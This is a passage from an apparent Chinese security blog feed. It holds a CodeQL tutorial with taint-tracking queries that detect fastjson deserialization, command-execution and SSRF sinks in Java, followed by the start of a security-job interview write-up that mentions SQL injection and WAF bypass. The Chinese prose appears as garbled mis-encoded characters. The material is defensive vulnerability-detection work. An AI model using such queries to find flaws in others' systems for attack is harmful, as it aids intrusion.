FastjsonVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    FastjsonVulConfig() &#123; this = &quot;fastjson&quot; &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call|</span><br><span class="line">            method.hasName(&quot;parseObject&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">            )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/fastjsonVul.png" class><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>å†™äº†æˆ‘ä¸€ä¼šå„¿ï¼Œç»è¿‡æŸ¥é˜…èµ„æ–™å‘ç°æœ‰ç›´æ¥ç°æˆçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"> class RceVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     RceVulConfig() &#123; this = &quot;RceVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from RceVulConfig rceVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where rceVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="SSRFï¼ˆé‡ç‚¹å…³æ³¨ï¼‰"><a href="#SSRFï¼ˆé‡ç‚¹å…³æ³¨ï¼‰" class="headerlink" title="SSRFï¼ˆé‡ç‚¹å…³æ³¨ï¼‰"></a>SSRFï¼ˆé‡ç‚¹å…³æ³¨ï¼‰</h3><p>è¿™é‡Œçš„å†…å®¹ä¸»è¦æ˜¯å‚è€ƒäºè¿™ç¯‡æ–‡ç«  <a class="link" href="https://forum.butian.net/share/2117">https://forum.butian.net/share/2117<i class="fas fa-external-link-alt"></i></a></p><p>è¿˜æ˜¯è§‰å¾—å…³äº SSRF çš„ ql è§„åˆ™è¿™å—å„¿ï¼Œåº”è¯¥å†è®°å½•ä¸€ä¸‹ï¼Œå…¶å®åœ¨ä¹‹å‰çœ‹å‘½ä»¤æ‰§è¡Œçš„ sink çš„æ—¶å€™å°±æ²¡è¿½è¸ªåˆ°ï¼Œä½†æ˜¯é‚£ä¸ªæ—¶å€™å¹¶æ²¡æœ‰æ·±å…¥å»çœ‹ã€‚</p><p>æœ€å¼€å§‹æˆ‘çš„ ql è¯­å¥æ˜¯è¿™æ ·çš„<del>ï¼ˆå¾ˆå«©çš„ ql è¯­å¥ï¼‰</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">         exists(Method method, MethodAccess call|</span><br><span class="line">             method.hasName(&quot;openConnection&quot;)</span><br><span class="line">             and</span><br><span class="line">             call.getMethod() = method and</span><br><span class="line">             sink.asExpr() = call.getArgument(0)</span><br><span class="line">             )</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>è¿½è¸ª <code>url.openConnection()</code>ï¼Œä½†è¿™å¾ˆæ˜æ˜¾æ˜¯è¿½è¸ªä¸åˆ°çš„ï¼Œå› ä¸º <code>url.openConnection()</code> æ˜¯ä¸ä¼ å‚çš„ã€‚é‚£ä¹ˆè¿™ä¸€æ¡é“¾è·¯ç”¨å›¾æ¥è¡¨ç¤ºçš„è¯ï¼Œæ–­åœ¨äº†è¿™é‡Œ</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/brokenSSRF.png" class><p>é‚£ä¹ˆä¸­é—´æ–­çš„åœ°æ–¹æˆ‘ä»¬è¦æƒ³åŠæ³•æ¥ä¸Šï¼Œè¿™å°±å›åˆ°äº†å‰æ–‡æåˆ°è¿‡çš„ <code>isAdditionalTaintStep</code> æ–¹æ³•ã€‚ä»åº”ç”¨è§’åº¦æ¥è¯´ä»£ç åº”è¯¥å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import semmle.code.java.security.QueryInjection</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> import semmle.code.java.security.RequestForgeryConfig</span><br><span class="line"> </span><br><span class="line"> class SSRFVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    SSRFVulConfig() &#123; this = &quot;SSRFVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink instanceof RequestForgerySink</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SSRFResult.png" class><p>æ­¤å¤„ import äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ <code>semmle.code.java.security.RequestForgeryConfig</code>ï¼Œè¿™é‡ŒåŒ¹é…äº†å¯¹åº”çš„è§„åˆ™ï¼Œå’Œä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œæ¥å£æ˜¯ä¸€æ ·çš„ã€‚å¯ä»¥æ·±å…¥çœ‹ä¸€ä¸‹å¯¹åº”çš„å®ç°ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ssrfSinkRealize.png" class><h4 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource and</span><br><span class="line">    // Exclude results of remote HTTP requests: fetching something else based on that result</span><br><span class="line">    // is no worse than following a redirect returned by the remote server, and typically</span><br><span class="line">    // we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span><br><span class="line">    not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>RequestForgeryConfig.qll</code> è§„åˆ™ä¸­çš„ Source åŒ¹é… <code>RemoteFlowSource</code>ï¼Œä¸”é™å®šäº† <code>java.net.URLConnection.getInputStream()</code> çš„è¾“å…¥ä¸ä¸ºæ¼æ´ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/NotTypeUrlConnection.png" class><p>è¿™é‡Œçš„åŸå› æ˜¯æ­¤å¤„çš„ <code>getInputStream()</code> çš„è¾“å…¥ä¸ä¸€å®šæ˜¯å¯æ§çš„ã€‚</p><h4 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123; sink instanceof RequestForgerySink &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› <code>RequestForgerySink</code></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RequestForgerySink.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span><br><span class="line">abstract class RequestForgerySink extends DataFlow::Node &#123; &#125;</span><br><span class="line"></span><br><span class="line">private class UrlOpenSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  UrlOpenSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;open-url&quot;) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class JdbcUrlSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  JdbcUrlSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;jdbc-url&quot;) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªç±»éƒ½åœ¨æ„é€ å‡½æ•°é‡Œé¢è°ƒç”¨äº† <code>sinkNode()</code>ï¼Œè·Ÿè¿›å»ï¼Œå¯¹åº”çš„æ–‡ä»¶æ˜¯ <code>java.dataflow.ExternalFlow.qll</code>ã€‚<br>å…³æ³¨åˆ°å®ƒçš„æ³¨é‡Šå†…å®¹å¤§è‡´æ„æ€æ˜¯åœ¨è¯´</p><p><strong>ä»…ä¾›å†…éƒ¨ä½¿ç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªå®éªŒAPI<br>æä¾›ç”¨äºå¤„ç†æŒ‡å®šçš„æµæ¨¡å‹çš„ç±»å’Œè°“è¯<br>æ•°æ®æ‰©å±•å’ŒCSVæ ¼å¼</strong></p><p>é‚£ä¹ˆè¿™é‡Œçš„å†…å®¹ï¼Œä¸€å®šæ˜¯ä»æŸä¸ª CSV æ–‡ä»¶é‡Œé¢å»è¯»å–çš„ï¼Œè¿™å°±è¢«å®šä¹‰ä¸º <code>ModelCsv</code> æˆ‘ä»¬å¯ä»¥ç®€åŒ–ä»£ç å®šä¹‰ sinkã€sourceã€flow stepï¼Œå¹¶é€šè¿‡<code>kind</code>æ¥ä½¿ç”¨å®ƒã€‚</p><ul><li>å®ƒçš„æ ¼å¼æœ‰è¿™ä¹ˆå‡ ç§</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Source: (SourceModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Sink: (SinkModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; kind; provenance</span><br><span class="line"></span><br><span class="line">Summaries: (SummaryModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Neutrals:</span><br><span class="line">package; type; name; signature; provenan</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ExternalFlowDescription.png" class><p>æ¯ä¸€ä¸ªå‚æ•°éƒ½ä»£è¡¨ä¸€ä¸ªå«ä¹‰ï¼Œæ•´ä½“æ¥è¯´å¦‚ä¸‹</p><p>packageï¼šåŒ…å<br>typeï¼šé€‰æ‹©åŒ…ä¸­çš„æŸä¸ªç±»å‹<br>subtypesï¼šå¸ƒå°”ç±»å‹ï¼ŒæŒ‡ç¤ºæ˜¯å¦è·³è½¬åˆ°å­ç±»<br>nameï¼šæ–¹æ³•å<br>signatureï¼šç­¾å<br>extï¼šç±»ä¼¼äºé™„åŠ ç±»<br>inputï¼šè¾“å…¥çš„ä½ç½®<br>kindï¼šå½“å‰ sink çš„ç±»å‹<br>provenanceï¼šæ¥æºéªŒè¯</p><p>è¿™ä¹ˆçœ‹çš„è¯æ¯”è¾ƒæŠ½è±¡ï¼Œä¸‹æ–‡ä¼šè¯¦ç»†è®²è§£ SSRF æ¼æ´ä¸­æ‰€å¯¹åº”çš„è§„åˆ™ã€‚</p><p>ç›®å‰ CodeQL å®˜æ–¹è¿˜å¹¶æœªå‘å¸ƒ SinkModelCsv çš„ä¸€äº›å®˜æ–¹è§„åˆ™ï¼ŒåŸå› æ˜¯æ­¤åŠŸèƒ½å°šä¸ç¨³å®šã€‚ä½¿ç”¨éœ€è¦å¼€å‘è€…&#x2F;å®‰å…¨äººå‘˜è‡ªå·±å®šä¹‰ç±»ï¼Œæ­¤ç±»éœ€ç»§æ‰¿ <code>xxxModelCsv</code> å³å¯åº”ç”¨ã€‚</p><p>sinkModelCsv è°“è¯æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private predicate sinkModelCsv(string row) &#123;</span><br><span class="line">  row =</span><br><span class="line">    [</span><br><span class="line">      // Open URL</span><br><span class="line">      &quot;java.net;URL;false;openConnection;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URL;false;openStream;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest;false;newBuilder;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest$Builder;false;uri;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[]);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader,URLStreamHandlerFactory);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader,URLStreamHandlerFactory);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;newInstance;;;Argument[0];open-url&quot;,</span><br><span class="line">      // Bean validation</span><br><span class="line">      &quot;javax.validation;ConstraintValidatorContext;true;buildConstraintViolationWithTemplate;;;Argument[0];bean-validation&quot;,</span><br><span class="line">      // Set hostname</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setDefaultHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;,</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥è·‘ <code>sinkNode()</code> ä»£ç ï¼Œç»“æœå¦‚ä¸‹</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sinkNodeRunResult.png" class><p>ä¹Ÿå°±æ˜¯é€šè¿‡ä¸Šè¿°çš„ <code>sinkModuleCsv</code>ï¼Œå…¶åŒ¹é…æ‰€æœ‰ open-url ç±»å‹çš„æ•°æ®ç±»å‹ã€‚</p><ul><li>ä½†æ˜¯åœ¨æ–°ç‰ˆæœ¬çš„ CodeQL å½“ä¸­æ˜¯æ‰¾ä¸åˆ°è¿™ä¸€ä¸ªè§„åˆ™çš„ï¼Œåœ¨æœç´¢äº†ä¸€å †èµ„æ–™åå‘ç°åœ¨æ–°ç‰ˆæœ¬ä¸­æ˜¯è¿™æ ·çš„ã€‚</li></ul><h4 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h4><p>çœ‹ä¸€ä¸‹å®ƒçš„è§„åˆ™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// è·Ÿè¿› RequestForgeryAdditionalTaintStep</span><br><span class="line"></span><br><span class="line">class RequestForgeryAdditionalTaintStep extends Unit &#123;</span><br><span class="line">  /**</span><br><span class="line">   * Holds if the step from `pred` to `succ` should be considered a taint</span><br><span class="line">   * step for server-side request forgery.</span><br><span class="line">   */</span><br><span class="line">  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep &#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    // propagate to a URI when its host is assigned to</span><br><span class="line">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">    or</span><br><span class="line">    // propagate to a URL when its host is assigned to</span><br><span class="line">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep</span><br><span class="line">&#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">      // Properties props = new Properties();</span><br><span class="line">      // props.setProperty(&quot;jdbcUrl&quot;, tainted);</span><br><span class="line">      // Propagate tainted value to the qualifier `props`</span><br><span class="line">      ma.getMethod() instanceof PropertiesSetPropertyMethod and</span><br><span class="line">      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;jdbcUrl&quot; and</span><br><span class="line">      pred.asExpr() = ma.getArgument(1) and</span><br><span class="line">      succ.asExpr() = ma.getQualifier()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ³¨é‡Šæ˜¯æ¯”è¾ƒæ˜ç¡®çš„ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ <code>isAdditionalFlowStep()</code>ï¼Œå°† <code>pred</code> å’Œ <code>succ</code> ä¸¤ä¸ªç‚¹è¿èµ·æ¥ï¼Œè¿™é‡Œçš„è¿æ¥æ–¹å¼æ˜¯é€šè¿‡æ±¡ç‚¹ä¼ é€’æ¥å®ç°çš„ã€‚å…·ä½“çš„åŒ¹é…æ–¹å¼å¾ˆå®¹æ˜“ç†è§£ï¼Œè·Ÿè¿›ä¸€ä¸‹ <code>UriCreation</code> å’Œ <code>UrlConstructorCall</code> å³å¯</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CodeQL Â· çœŸå…¥é—¨&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/categories/CodeQL/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023 æ˜¥æ‹›å®‰å…¨ç ”ç©¶å²—ä½é¢ç»åˆ†äº«</title>
    <link href="https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/"/>
    <id>https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/</id>
    <published>2023-08-23T14:39:22.000Z</published>
    <updated>2023-12-13T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>éšæ‰‹è®°å½•ä¸€ä¸‹</p><span id="more"></span><h2 id="å®‰æ’å«å…µå®éªŒå®¤"><a href="#å®‰æ’å«å…µå®éªŒå®¤" class="headerlink" title="å®‰æ’å«å…µå®éªŒå®¤"></a>å®‰æ’å«å…µå®éªŒå®¤</h2><p>1ã€ä½ çš„ç®€å†ä¸ä½ ä¹‹å‰å‘è¿‡æ¥çš„ç®€å†æœ‰ä»€ä¹ˆå˜åŒ–å—ï¼Ÿ</p><p>2ã€è¯´ä¸€è¯´ä½ ç ”ç©¶è¿‡çš„ä¸œè¥¿ï¼Œç„¶åæœ‰ä»€ä¹ˆäº§å‡º</p><p>è¿™é‡Œæˆ‘è¯´ç ”ç©¶äº† Weblogicã€shiroï¼Œä½†æ˜¯æ²¡äº§å‡ºï¼Œé‚£è¾¹ä¼¼ä¹æ¯”è¾ƒå¤±æœ›ã€‚</p><p>3ã€æœ€è¿‘å‡ºäº† Weblogic çš„ä¸€ä¸ªæ–°çš„æ´ï¼Œä½ æœ‰ç ”ç©¶è¿‡å—ï¼Ÿè‡ªå·±åœ¨ç ”ç©¶çš„æ—¶å€™æœ‰æ²¡æœ‰æ€è€ƒè¿‡åˆ«äººæ˜¯æ€ä¹ˆæŒ–å‡ºæ¥çš„æ´ã€‚</p><p>äººéº»äº†ï¼Œæ²¡å¤ç°æ¼æ´è¿‡ï¼Œç„¶åä¹Ÿæ²¡æ€è€ƒè¿‡è¿™ä¸ªã€‚ã€‚</p><p>4ã€ä½ è§‰å¾—æŒ–ä»€ä¹ˆæ ·å­çš„æ´æ¯”è¾ƒå¥½å‘¢ï¼Ÿä½ ä¸€èˆ¬æ˜¯æ€ä¹ˆå¼€å±•ç ”ç©¶çš„</p><p>æˆ‘è¯´çœ‹æ¼æ´ç±»å‹ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•ä½ éœ€è¦å…ˆå»ç®€å•äº†è§£ä¸€ä¸‹å®ƒçš„æµç¨‹ï¼Œå¦‚æœä¸€ä¸ªç»„ä»¶çš„æµç¨‹ä½ ä¸æ¸…æ¥šï¼Œç›²ç›®çš„å¼€å§‹æŒ–æ´æ¯”è¾ƒæ„šè ¢ï¼Œåƒç›²äººæ‘¸è±¡ã€‚ç„¶ååœ¨äº†è§£è¿‡åŸºç¡€æµç¨‹ä¹‹åï¼Œå¦‚æœæ˜¯ååºåˆ—åŒ–çš„æ´ï¼Œå°±ç”¨ codeqlã€tabby è¿™äº›ä¸œè¥¿å»æ‰¾æ¼æ´ã€‚</p><p>ä¸çŸ¥é“é‚£è¾¹æ˜¯ä»€ä¹ˆæƒ³æ³•ï¼Œä¸è¿‡æœ‰ä¸€è¯´ä¸€é¢æˆ‘çš„æ—¶å€™æ„Ÿè§‰å¤§éƒ¨åˆ†æ—¶å€™éƒ½æ˜¯å¸æ°”å’Œå¹æ°”qaq</p><p>5ã€ä½ å­¦ä¹ å®‰å…¨æ˜¯ä»€ä¹ˆæ—¶å€™å¼€å§‹çš„å‘¢ï¼Œä¸€è·¯ä¸Šçš„ç»å†æ˜¯æ€ä¹ˆæ ·çš„</p><p>å°±ç®€å•èŠäº†èŠ</p><p>6ã€æœ‰æ²¡æœ‰ä»€ä¹ˆè®©ä½ æ„Ÿè§‰å¾ˆè‡ªè±ªçš„é¡¹ç›®</p><p>å½“æ—¶è¯´äº† golang å†™ sqlmap</p><p>7ã€ä½ æ˜¯ä»€ä¹ˆçŠ¶å†µä¸‹å»å­¦ä¹  golang çš„å‘¢ï¼Ÿæ˜¯å‡ºäºä»€ä¹ˆè€ƒè™‘å‘¢</p><p>ä¼¼ä¹å¾ˆå¤šé¢è¯•å®˜éƒ½ä¼šé—®è¿™ä¸ªé—®é¢˜ï¼Œè¿˜æ˜¯å’Œä¹‹å‰ä¸€æ ·å›ç­”äº†ä¸€ä¸‹ã€‚</p><p>8ã€ä¸ºä»€ä¹ˆåœ¨è¿è¿åªå®ä¹ äº†ä¸€ä¸ªæœˆå‘¢ï¼Ÿéƒ½åšäº†ä»€ä¹ˆä¸šåŠ¡</p><p>xxx</p><p>9ã€èƒ½ç®€å•è¯´è¯´åœ¨è¿è¿åšäº†ä»€ä¹ˆæ¸—é€æµ‹è¯•å—ï¼Ÿ</p><p>10ã€èƒ½è¯´ä¸€è¯´å¸¸è§çš„ SQL æ³¨å…¥ç§ç±»å—ï¼Ÿè‡ªå·±æœ‰ç»•è¿‡è¿‡ä¸€äº› SQL æ³¨å…¥çš„ waf å—ï¼Ÿ</p><p>è¿™é‡Œè¯´äº†ç»•è¿‡å®‰å…¨ç‹—ï¼Œéº»äº†ï¼Œå½“æ—¶å°±æƒ³åˆ°å¾ˆå¯èƒ½ä¼šé—® HIDS çš„ç›¸å…³å†…å®¹ï¼Œæœä¸å…¶ç„¶åé¢å°±é—®äº†</p><p>11ã€ä¸€èˆ¬æ˜¯æ€ä¹ˆç»• waf å‘¢ï¼Ÿå…·ä½“è¯´è¯´</p><p>æˆ‘è¯´äº†å…ˆ fuzzï¼Œç„¶åå…·ä½“çš„ bypass å°±æ 